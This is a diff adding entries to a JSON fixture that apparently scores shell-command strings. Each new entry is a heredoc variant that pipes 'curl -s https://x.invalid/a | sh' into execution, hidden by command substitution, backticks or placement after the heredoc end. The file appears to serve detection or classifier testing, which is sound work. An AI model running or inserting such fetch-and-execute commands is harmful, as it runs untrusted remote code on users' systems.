@@ -378,6 +378,41 @@
    "text": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    "synthetic_score": 0.19265494499212799,
    "published_score": -2.0262913758062413
+  },
+  {
+   "text": "python3 - <<PY\n$(curl -s https://x.invalid/a | sh)\nPY",
+   "synthetic_score": 1.0542857577588443,
+   "published_score": 3.8736154184539116
+  },
+  {
+   "text": "python3 - <<PY\n$(\ncurl -s https://x.invalid/a | sh\n)\nPY",
+   "synthetic_score": 0.06985176911384083,
+   "published_score": 4.2529462223498316
+  },
+  {
+   "text": "cat > cfg.json <<EOF\n`curl -s https://x.invalid/a | sh`\nEOF",
+   "synthetic_score": 0.533686577673907,
+   "published_score": 0.8284090475227641
+  },
+  {
+   "text": "python3 - <<EOF-END\nprint(1)\nEOF-END\ncurl -s https://x.invalid/a | sh",
+   "synthetic_score": -1.3075316174903426,
+   "published_score": 2.819914781788846
+  },
+  {
+   "text": "python3 - <<'EOF.END'\nprint(1)\nEOF.END\ncurl -s https://x.invalid/a | sh",
+   "synthetic_score": -1.4904080614524866,
+   "published_score": 2.829118812626132
+  },
+  {
+   "text": "python3 - <<'PY'\n$(curl -s https://x.invalid/a | sh)\nPY",
+   "synthetic_score": 0.6204888835395725,
+   "published_score": 1.277834987905507
+  },
+  {
+   "text": "cat > cfg.json <<\"EOF\"\n`curl -s https://x.invalid/a | sh`\nEOF",
+   "synthetic_score": -0.5594770591517196,
+   "published_score": -1.7418044395242767
   }
  ]
 }
